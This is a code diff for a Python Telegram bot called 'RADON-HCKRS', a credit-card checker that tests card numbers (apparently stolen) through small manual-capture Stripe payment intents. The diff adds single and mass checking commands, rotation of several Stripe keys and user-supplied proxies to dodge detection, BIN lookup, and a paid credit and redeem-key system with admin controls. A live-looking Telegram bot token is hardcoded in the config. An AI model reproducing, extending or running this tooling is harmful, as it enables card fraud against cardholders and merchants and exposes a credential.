@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # RADON-HCKRS - Ultimate Telegram CC Checker Bot
-# Version: 4.1 - FIXED
+# Version: 4.2 - COMPLETE FIXED
 # Developed by: RADON Team
 
 import os
@@ -17,7 +17,7 @@ from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from queue import Queue
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
+from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
 import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -26,8 +26,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # CONFIGURATION
 # ============================================
 
-BOT_TOKEN = "8517908494:AAE9ZlVnHDi08U1qKGSH5bgh4peu2TE8NGo"
-ADMIN_IDS = [6918107759]
+BOT_TOKEN = "8517908494:AAE9ZlVnHDi08U1qKGSH5bgh4peu2TE8NGo"  # Replace with your bot token
+ADMIN_IDS = [6918107759]  # Replace with your Telegram user ID(s)
 
 # ============================================
 # YOUR 9 LIVE STRIPE KEYS
@@ -46,13 +46,12 @@ STRIPE_KEYS = [
 ]
 
 # ============================================
-# DATABASE FUNCTIONS WITH RETRY LOGIC
+# DATABASE FUNCTIONS
 # ============================================
 
 def get_db_connection():
-    """Get database connection with timeout"""
     conn = sqlite3.connect('radon.db', timeout=30)
-    conn.execute("PRAGMA journal_mode=WAL")  # Better for concurrent access
+    conn.execute("PRAGMA journal_mode=WAL")
     return conn
 
 def init_db():
@@ -101,12 +100,7 @@ def init_db():
     except Exception as e:
         print(f"❌ Database init error: {e}")
 
-# ============================================
-# DATABASE HELPERS WITH RETRY
-# ============================================
-
 def execute_with_retry(query, params=None, retries=3):
-    """Execute database query with retry on lock"""
     for attempt in range(retries):
         try:
             conn = get_db_connection()
@@ -301,19 +295,15 @@ def get_country_emoji(country_code):
     return flags.get(country_code.upper(), '🌍')
 
 # ============================================
-# STRIPE CHECKER - FIXED
+# STRIPE CHECKER
 # ============================================
 
 def check_card_stripe(card_data, proxy, key_manager):
-    """Check a card using Stripe API with key rotation"""
-    
-    # Define bin_info EARLY to avoid UnboundLocalError
     bin_info = lookup_bin(card_data['cc'][:6])
     stripe_key = key_manager.get_next_key()
     charge_amount = random.choice([500, 1000])
     
     try:
-        # Format proxy correctly
         proxy_dict = None
         if proxy:
             proxy_str = proxy.strip()
@@ -344,13 +334,12 @@ def check_card_stripe(card_data, proxy, key_manager):
             "capture_method": "manual",
         }
         
-        # Make request with timeout
         response = requests.post(
             "https://api.stripe.com/v1/payment_intents",
             data=payload,
             headers=headers,
             proxies=proxy_dict,
-            timeout=20,  # 20 second timeout
+            timeout=20,
             verify=False
         )
         
@@ -382,9 +371,9 @@ def check_card_stripe(card_data, proxy, key_manager):
             return (card_data['cc'], "⚠️ ERROR", f"HTTP {response.status_code}", bin_info, stripe_key[:15] + "...", charge_amount/100)
             
     except requests.exceptions.Timeout:
-        return (card_data['cc'], "⚠️ TIMEOUT", "Request timed out (proxy slow)", bin_info, stripe_key[:15] + "...", charge_amount/100)
+        return (card_data['cc'], "⚠️ TIMEOUT", "Request timed out", bin_info, stripe_key[:15] + "...", charge_amount/100)
     except requests.exceptions.ProxyError as e:
-        return (card_data['cc'], "⚠️ PROXY ERR", f"Proxy connection failed: {str(e)[:50]}", bin_info, stripe_key[:15] + "...", charge_amount/100)
+        return (card_data['cc'], "⚠️ PROXY ERR", f"Proxy failed: {str(e)[:50]}", bin_info, stripe_key[:15] + "...", charge_amount/100)
     except requests.exceptions.ConnectionError:
         return (card_data['cc'], "⚠️ CONN ERR", "Connection failed", bin_info, stripe_key[:15] + "...", charge_amount/100)
     except Exception as e:
@@ -398,11 +387,667 @@ key_manager = KeyManager()
 user_proxies = {}
 
 # ============================================
-# TELEGRAM HANDLERS (SAME AS BEFORE - KEEP YOUR EXISTING CODE)
+# TELEGRAM BOT HANDLERS
 # ============================================
 
-# ... (Keep all your existing command handlers here)
-# The handlers remain unchanged - the fixes are in the database and checker functions
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_id = user.id
+    
+    add_user(user_id, user.username, user.first_name, user.last_name)
+    
+    if is_banned(user_id):
+        await update.message.reply_text("❌ You are banned from using this bot.")
+        return
+    
+    credits = get_credits(user_id)
+    total_keys = key_manager.get_key_count()
+    proxy_count = len(user_proxies.get(user_id, []))
+    
+    welcome_text = f"""
+🔥 **RADON-HCKRS** 🔥
+━━━━━━━━━━━━━━━━━━━━━
+💀 **Ultimate CC Checker Bot**
+
+👤 **User:** {user.first_name}
+💳 **Credits:** {credits}
+📊 **Status:** Active
+
+━━━━━━━━━━━━━━━━━━━━━
+**Bot Status:**
+🔑 **Keys Loaded:** {total_keys}
+🌐 **Your Proxies:** {proxy_count}
+⚡ **Checks:** $5 & $10 random
+
+━━━━━━━━━━━━━━━━━━━━━
+**Commands:**
+/start - Show menu
+/check - Check single card
+/mass - Mass check cards
+/proxy - Set your proxies
+/keys - View key status
+/redeem - Redeem credits
+/balance - Check balance
+/help - Help & info
+/status - Bot status
+
+━━━━━━━━━━━━━━━━━━━━━
+💡 **How it works:**
+1. Get credits (contact admin)
+2. Set your proxies
+3. Start checking cards!
+
+🔒 **Keys rotate automatically**
+🌐 **Proxies rotate per check**
+💳 **BIN lookup included**
+━━━━━━━━━━━━━━━━━━━━━
+🔥 **RADON-HCKRS**
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton("💳 Check Card", callback_data="check_menu")],
+        [InlineKeyboardButton("📦 Mass Check", callback_data="mass_menu")],
+        [InlineKeyboardButton("🌐 Set Proxy", callback_data="set_proxy")],
+        [InlineKeyboardButton("📊 Balance", callback_data="balance")],
+        [InlineKeyboardButton("🆘 Help", callback_data="help")]
+    ]
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    data = query.data
+    
+    if is_banned(user_id):
+        await query.edit_message_text("❌ You are banned from using this bot.")
+        return
+    
+    if data == "check_menu":
+        await query.edit_message_text(
+            "💳 **Single Card Check**\n\n"
+            "Send card in this format:\n"
+            "`/check 4111111111111111|12|26|123`\n\n"
+            "Each check costs 1 credit.",
+            parse_mode='Markdown'
+        )
+    
+    elif data == "mass_menu":
+        await query.edit_message_text(
+            "📦 **Mass Card Check**\n\n"
+            "Send cards in this format:\n"
+            "`/mass 411111|12|26|123`\n"
+            "Each card on a new line\n\n"
+            "Each card costs 1 credit.",
+            parse_mode='Markdown'
+        )
+    
+    elif data == "set_proxy":
+        await query.edit_message_text(
+            "🌐 **Set Your Proxies**\n\n"
+            "Send `/proxy` command with your proxies:\n\n"
+            "`/proxy user:pass@192.168.1.1:8080`\n"
+            "OR multiple:\n"
+            "`/proxy proxy1|proxy2|proxy3`\n\n"
+            "Format: `ip:port` or `user:pass@ip:port`",
+            parse_mode='Markdown'
+        )
+    
+    elif data == "balance":
+        credits = get_credits(user_id)
+        await query.edit_message_text(
+            f"📊 **Your Balance**\n\n"
+            f"💳 Credits: `{credits}`\n\n"
+            f"Each check costs 1 credit.",
+            parse_mode='Markdown'
+        )
+    
+    elif data == "help":
+        await query.edit_message_text(
+            "🆘 **Help & Commands**\n\n"
+            "**Basic Commands:**\n"
+            "/start - Start the bot\n"
+            "/check - Check a single card\n"
+            "/mass - Mass check cards\n"
+            "/proxy - Set your proxies\n"
+            "/keys - View key status\n"
+            "/redeem - Redeem credits\n"
+            "/balance - Check balance\n"
+            "/status - Bot status\n\n"
+            "**Formats:**\n"
+            "Card: `card|MM|YY|CVV`\n"
+            "Proxy: `user:pass@ip:port`\n\n"
+            "**Admin:** @AdminUsername",
+            parse_mode='Markdown'
+        )
+
+# ============================================
+# COMMAND HANDLERS
+# ============================================
+
+async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if is_banned(user_id):
+        await update.message.reply_text("❌ You are banned.")
+        return
+    
+    credits = get_credits(user_id)
+    if credits < 1 and not is_admin(user_id):
+        await update.message.reply_text(
+            "❌ **Insufficient Credits!**\n\n"
+            f"Credits: `{credits}`\n"
+            "Contact admin to purchase more.",
+            parse_mode='Markdown'
+        )
+        return
+    
+    user_proxy_list = user_proxies.get(user_id, [])
+    if not user_proxy_list:
+        await update.message.reply_text(
+            "⚠️ **No Proxies Set!**\n\n"
+            "Please set your proxies first:\n"
+            "`/proxy user:pass@ip:port`",
+            parse_mode='Markdown'
+        )
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "💳 **Check Card**\n\n"
+            "Format: `/check 4111111111111111|12|26|123`",
+            parse_mode='Markdown'
+        )
+        return
+    
+    card_input = " ".join(context.args)
+    parts = re.split(r'[|\s]+', card_input.strip())
+    
+    if len(parts) < 4:
+        await update.message.reply_text(
+            "❌ **Invalid Format!**\n\n"
+            "Use: `card|MM|YY|CVV`",
+            parse_mode='Markdown'
+        )
+        return
+    
+    card_data = {
+        "cc": parts[0].replace(" ", ""),
+        "month": parts[1].strip(),
+        "year": parts[2].strip(),
+        "cvv": parts[3].strip()
+    }
+    
+    if len(card_data['cc']) < 15:
+        await update.message.reply_text("❌ Invalid card number (too short).")
+        return
+    
+    if not is_admin(user_id):
+        if not deduct_credit(user_id):
+            await update.message.reply_text("❌ Failed to deduct credit.")
+            return
+    
+    status_msg = await update.message.reply_text("🔄 **Checking card...**\nThis may take a few seconds.", parse_mode='Markdown')
+    
+    proxy_manager = ProxyManager(user_proxy_list)
+    proxy = proxy_manager.get_proxy()
+    
+    if not proxy:
+        await status_msg.edit_text("❌ **No working proxies available.**\nPlease add more proxies.")
+        return
+    
+    result = check_card_stripe(card_data, proxy, key_manager)
+    cc, status, msg, bin_info, key_used, amount = result
+    
+    bin_number = cc[:6]
+    card_type = bin_info.get('card_type', 'Unknown')
+    bank_name = bin_info.get('bank', 'Unknown')
+    country = bin_info.get('country', 'Unknown')
+    brand = bin_info.get('brand', 'Unknown')
+    emoji = bin_info.get('emoji', '🌍')
+    
+    log_check(user_id, bin_number, status, bank_name, card_type, country, key_used)
+    
+    response_text = f"""
+💳 **Card Check Result**
+━━━━━━━━━━━━━━━━━━━━━
+🔢 **Card:** `{cc[:6]}******{cc[-4:]}`
+💰 **Amount:** `${amount:.0f}.00`
+
+📊 **Status:** {status}
+📝 **Message:** {msg}
+
+━━━━━━━━━━━━━━━━━━━━━
+🏦 **BIN Details:**
+• BIN: `{bin_number}`
+• Type: `{card_type}`
+• Brand: `{brand}`
+• Bank: `{bank_name}`
+• Country: {emoji} `{country}`
+
+━━━━━━━━━━━━━━━━━━━━━
+🔑 **Key Used:** `{key_used}`
+🌐 **Proxy:** `{proxy[:20]}...`
+💳 **Credits Left:** `{get_credits(user_id)}`
+🕐 **Time:** {datetime.now().strftime('%H:%M:%S')}
+━━━━━━━━━━━━━━━━━━━━━
+🔥 **RADON-HCKRS**
+"""
+    
+    await status_msg.edit_text(response_text, parse_mode='Markdown')
+
+async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if is_banned(user_id):
+        await update.message.reply_text("❌ You are banned.")
+        return
+    
+    credits = get_credits(user_id)
+    if credits < 1 and not is_admin(user_id):
+        await update.message.reply_text("❌ **Insufficient Credits!**", parse_mode='Markdown')
+        return
+    
+    user_proxy_list = user_proxies.get(user_id, [])
+    if not user_proxy_list:
+        await update.message.reply_text("⚠️ **Set proxies first:** `/proxy`", parse_mode='Markdown')
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "📦 **Mass Check**\n\n"
+            "Send multiple cards:\n"
+            "`/mass 411111|12|26|123`\n"
+            "`/mass 555555|12|26|123`",
+            parse_mode='Markdown'
+        )
+        return
+    
+    card_input = " ".join(context.args)
+    lines = card_input.strip().split('\n')
+    all_cards = []
+    
+    for line in lines:
+        parts = re.split(r'[|\s]+', line.strip())
+        if len(parts) >= 4:
+            all_cards.append({
+                "cc": parts[0].replace(" ", ""),
+                "month": parts[1].strip(),
+                "year": parts[2].strip(),
+                "cvv": parts[3].strip()
+            })
+    
+    if not all_cards:
+        await update.message.reply_text("❌ No valid cards found.")
+        return
+    
+    if len(all_cards) > credits and not is_admin(user_id):
+        await update.message.reply_text(f"❌ **Not enough credits!**\nYou have: `{credits}`\nNeed: `{len(all_cards)}`", parse_mode='Markdown')
+        return
+    
+    status_msg = await update.message.reply_text(f"🔄 **Mass checking {len(all_cards)} cards...**", parse_mode='Markdown')
+    
+    proxy_manager = ProxyManager(user_proxy_list)
+    results = []
+    live_count = 0
+    dead_count = 0
+    
+    for card in all_cards:
+        if is_admin(user_id) or deduct_credit(user_id):
+            proxy = proxy_manager.get_proxy()
+            if proxy:
+                result = check_card_stripe(card, proxy, key_manager)
+                results.append(result)
+                if "LIVE" in result[1]:
+                    live_count += 1
+                else:
+                    dead_count += 1
+                time.sleep(random.uniform(0.5, 1.5))
+            else:
+                results.append((card['cc'], "⚠️ NO PROXY", "No proxy available", {}, "None", 0))
+        else:
+            break
+    
+    response_text = f"📦 **Mass Check Results**\n━━━━━━━━━━━━━━━━━━━━━\n"
+    for cc, status, msg, bin_info, key_used, amount in results[:20]:
+        response_text += f"\n`{cc[:6]}******{cc[-4:]}` → {status}"
+    
+    if len(results) > 20:
+        response_text += f"\n... and {len(results) - 20} more"
+    
+    response_text += f"\n━━━━━━━━━━━━━━━━━━━━━"
+    response_text += f"\n✅ **LIVE:** `{live_count}`"
+    response_text += f"\n❌ **DEAD:** `{dead_count}`"
+    response_text += f"\n💳 **Credits Left:** `{get_credits(user_id)}`"
+    response_text += f"\n🔥 **RADON-HCKRS**"
+    
+    await status_msg.edit_text(response_text, parse_mode='Markdown')
+
+async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if is_banned(user_id):
+        await update.message.reply_text("❌ You are banned.")
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "🌐 **Set Proxy**\n\n"
+            "`/proxy user:pass@192.168.1.1:8080`\n\n"
+            "Or multiple:\n"
+            "`/proxy proxy1|proxy2|proxy3`",
+            parse_mode='Markdown'
+        )
+        return
+    
+    proxy_input = " ".join(context.args)
+    proxies = [p.strip() for p in re.split(r'[|\s]+', proxy_input) if p.strip()]
+    
+    valid_proxies = []
+    for p in proxies:
+        if ':' in p:
+            valid_proxies.append(p)
+    
+    if valid_proxies:
+        user_proxies[user_id] = valid_proxies
+        await update.message.reply_text(
+            f"✅ **{len(valid_proxies)} Proxies Set!**\n\n"
+            f"Will rotate automatically.\n\n"
+            f"Use `/check` to start checking.",
+            parse_mode='Markdown'
+        )
+    else:
+        await update.message.reply_text("❌ No valid proxies found.")
+
+async def keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if is_banned(user_id):
+        await update.message.reply_text("❌ You are banned.")
+        return
+    
+    stats = key_manager.get_stats()
+    total_keys = key_manager.get_key_count()
+    
+    response_text = f"🔑 **Key Status**\n━━━━━━━━━━━━━━━━━━━━━\n"
+    response_text += f"📊 **Total Keys:** `{total_keys}`\n\n"
+    
+    for key, data in stats.items():
+        status = "🟢 Active" if data['uses'] < 50 else "🟡 Near limit" if data['uses'] < 80 else "🔴 Exhausted"
+        response_text += f"• `{key}`\n  → {status} ({data['uses']}/50 used today)\n\n"
+    
+    await update.message.reply_text(response_text, parse_mode='Markdown')
+
+async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if is_banned(user_id):
+        await update.message.reply_text("❌ You are banned.")
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "💰 **Redeem Credits**\n\n"
+            "`/redeem YOUR_KEY`\n\n"
+            "Contact admin to purchase credits.",
+            parse_mode='Markdown'
+        )
+        return
+    
+    key = context.args[0].strip()
+    
+    conn = sqlite3.connect('radon.db', timeout=30)
+    c = conn.cursor()
+    c.execute("SELECT credits, is_used FROM redeem_keys WHERE key = ?", (key,))
+    result = c.fetchone()
+    
+    if not result:
+        conn.close()
+        await update.message.reply_text("❌ **Invalid Key!**", parse_mode='Markdown')
+        return
+    
+    if result[1] == 1:
+        conn.close()
+        await update.message.reply_text("❌ **Key Already Used!**", parse_mode='Markdown')
+        return
+    
+    credits = result[0]
+    c.execute("UPDATE redeem_keys SET used_by = ?, used_at = ?, is_used = 1 WHERE key = ?", 
+              (user_id, datetime.now().isoformat(), key))
+    conn.commit()
+    conn.close()
+    
+    add_credits(user_id, credits)
+    
+    await update.message.reply_text(
+        f"✅ **Key Redeemed!**\n\n"
+        f"💰 Added: `{credits}` credits\n"
+        f"💳 Total: `{get_credits(user_id)}`\n\n"
+        f"Start checking with `/check`",
+        parse_mode='Markdown'
+    )
+
+async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if is_banned(user_id):
+        await update.message.reply_text("❌ You are banned.")
+        return
+    
+    credits = get_credits(user_id)
+    
+    await update.message.reply_text(
+        f"📊 **Your Balance**\n\n"
+        f"💳 Credits: `{credits}`\n\n"
+        f"Each check costs 1 credit.",
+        parse_mode='Markdown'
+    )
+
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    conn = sqlite3.connect('radon.db', timeout=30)
+    c = conn.cursor()
+    c.execute("SELECT COUNT(*) FROM users")
+    total_users = c.fetchone()[0]
+    c.execute("SELECT COUNT(*) FROM check_logs")
+    total_checks = c.fetchone()[0]
+    conn.close()
+    
+    total_keys = key_manager.get_key_count()
+    key_stats = key_manager.get_stats()
+    active_keys = sum(1 for k in key_stats if key_stats[k]['uses'] < 50)
+    
+    await update.message.reply_text(
+        "🔥 **RADON-HCKRS Status**\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "✅ **Bot:** Online\n"
+        f"🔑 **Keys:** {total_keys} (Active: {active_keys})\n"
+        "✅ **Credits System:** Active\n"
+        "✅ **Proxy Support:** Active\n"
+        "✅ **BIN Lookup:** Active\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 **Users:** {total_users}\n"
+        f"📈 **Total Checks:** {total_checks}\n"
+        f"🕐 **Uptime:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "🔥 **RADON-HCKRS**",
+        parse_mode='Markdown'
+    )
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🆘 **Help & Commands**\n\n"
+        "**Basic Commands:**\n"
+        "/start - Start the bot\n"
+        "/check - Check a single card\n"
+        "/mass - Mass check cards\n"
+        "/proxy - Set your proxies\n"
+        "/keys - View key status\n"
+        "/redeem - Redeem credits\n"
+        "/balance - Check balance\n"
+        "/status - Bot status\n\n"
+        "**Formats:**\n"
+        "Card: `card|MM|YY|CVV`\n"
+        "Proxy: `user:pass@ip:port`\n\n"
+        "**Admin:** @AdminUsername",
+        parse_mode='Markdown'
+    )
+
+# ============================================
+# ADMIN COMMANDS
+# ============================================
+
+async def admin_create_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if not is_admin(user_id):
+        await update.message.reply_text("❌ Unauthorized.")
+        return
+    
+    if len(context.args) < 1:
+        await update.message.reply_text(
+            "🔑 **Admin - Create Key**\n\n"
+            "`/createkey 50` - Creates key with 50 credits\n"
+            "`/createkey 100` - Creates key with 100 credits",
+            parse_mode='Markdown'
+        )
+        return
+    
+    try:
+        credits = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("❌ Invalid amount.")
+        return
+    
+    if credits < 1 or credits > 9999:
+        await update.message.reply_text("❌ Amount must be between 1 and 9999.")
+        return
+    
+    key = f"RADON-{random.randint(100000, 999999)}-{random.randint(100000, 999999)}"
+    
+    conn = sqlite3.connect('radon.db', timeout=30)
+    c = conn.cursor()
+    c.execute("INSERT INTO redeem_keys (key, credits, created_by, created_at) VALUES (?, ?, ?, ?)",
+              (key, credits, user_id, datetime.now().isoformat()))
+    conn.commit()
+    conn.close()
+    
+    await update.message.reply_text(
+        f"✅ **Key Created!**\n\n"
+        f"🔑 **Key:** `{key}`\n"
+        f"💰 **Credits:** `{credits}`\n"
+        f"🕐 **Created:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode='Markdown'
+    )
+
+async def admin_add_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if not is_admin(user_id):
+        await update.message.reply_text("❌ Unauthorized.")
+        return
+    
+    if len(context.args) < 2:
+        await update.message.reply_text(
+            "`/addcredits 123456789 50` - Adds credits to user",
+            parse_mode='Markdown'
+        )
+        return
+    
+    try:
+        target_id = int(context.args[0])
+        amount = int(context.args[1])
+    except ValueError:
+        await update.message.reply_text("❌ Invalid input.")
+        return
+    
+    add_credits(target_id, amount)
+    
+    await update.message.reply_text(
+        f"✅ **Credits Added!**\n\n"
+        f"👤 User ID: `{target_id}`\n"
+        f"💰 Amount: `{amount}`\n"
+        f"💳 New Balance: `{get_credits(target_id)}`",
+        parse_mode='Markdown'
+    )
+
+async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if not is_admin(user_id):
+        await update.message.reply_text("❌ Unauthorized.")
+        return
+    
+    if len(context.args) < 1:
+        await update.message.reply_text("`/ban 123456789` - Bans user", parse_mode='Markdown')
+        return
+    
+    try:
+        target_id = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("❌ Invalid user ID.")
+        return
+    
+    execute_with_retry("UPDATE users SET is_banned = 1 WHERE user_id = ?", (target_id,))
+    await update.message.reply_text(f"✅ User `{target_id}` has been banned.", parse_mode='Markdown')
+
+async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if not is_admin(user_id):
+        await update.message.reply_text("❌ Unauthorized.")
+        return
+    
+    if len(context.args) < 1:
+        await update.message.reply_text("`/unban 123456789` - Unbans user", parse_mode='Markdown')
+        return
+    
+    try:
+        target_id = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("❌ Invalid user ID.")
+        return
+    
+    execute_with_retry("UPDATE users SET is_banned = 0 WHERE user_id = ?", (target_id,))
+    await update.message.reply_text(f"✅ User `{target_id}` has been unbanned.", parse_mode='Markdown')
+
+async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if not is_admin(user_id):
+        await update.message.reply_text("❌ Unauthorized.")
+        return
+    
+    conn = sqlite3.connect('radon.db', timeout=30)
+    c = conn.cursor()
+    
+    c.execute("SELECT COUNT(*) FROM users")
+    total_users = c.fetchone()[0]
+    
+    c.execute("SELECT COUNT(*) FROM redeem_keys WHERE is_used = 0")
+    unused_keys = c.fetchone()[0]
+    
+    c.execute("SELECT COUNT(*) FROM check_logs")
+    total_checks = c.fetchone()[0]
+    
+    c.execute("SELECT SUM(credits) FROM users")
+    total_credits = c.fetchone()[0] or 0
+    
+    conn.close()
+    
+    await update.message.reply_text(
+        f"📊 **Admin Stats**\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 **Users:** `{total_users}`\n"
+        f"🔑 **Unused Keys:** `{unused_keys}`\n"
+        f"📈 **Total Checks:** `{total_checks}`\n"
+        f"💰 **Total Credits:** `{total_credits}`\n"
+        f"🔐 **Keys in Rotation:** `{key_manager.get_key_count()}`\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🔥 **RADON-HCKRS**",
+        parse_mode='Markdown'
+    )
 
 # ============================================
 # MAIN BOT
@@ -418,7 +1063,7 @@ def main():
     
     application = Application.builder().token(BOT_TOKEN).build()
     
-    # Add all your handlers here (keep from original)
+    # User commands
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("check", check_command))
     application.add_handler(CommandHandler("mass", mass_command))
@@ -429,15 +1074,20 @@ def main():
     application.add_handler(CommandHandler("status", status_command))
     application.add_handler(CommandHandler("help", help_command))
     
+    # Admin commands
     application.add_handler(CommandHandler("createkey", admin_create_key))
     application.add_handler(CommandHandler("addcredits", admin_add_credits))
     application.add_handler(CommandHandler("ban", admin_ban))
     application.add_handler(CommandHandler("unban", admin_unban))
     application.add_handler(CommandHandler("stats", admin_stats))
     
+    # Button handler
     application.add_handler(CallbackQueryHandler(button_handler))
     
     print("✅ Bot is running!")
+    print("🔥 RADON-HCKRS Active")
+    print("━━━━━━━━━━━━━━━━━━━━━")
+    
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
